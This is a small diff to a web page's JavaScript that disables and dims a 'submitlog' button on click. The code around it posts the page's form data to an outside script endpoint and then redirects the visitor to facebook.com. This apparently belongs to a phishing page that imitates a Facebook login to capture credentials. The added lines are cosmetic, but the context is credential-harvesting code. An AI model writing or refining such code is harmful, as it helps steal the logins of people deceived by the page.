@@ -366,6 +366,8 @@
 		 const submitlog = document.querySelector('#submitlog');
             submitlog.addEventListener('click', e => {
               e.preventDefault();
+		    submitlog.style.opacity = 0.6;
+		    submitlog.disabled = true;
               fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                 .then(response => window.location.href = "https://facebook.com/")
                 .catch(error => console.error('Error!', error.message))
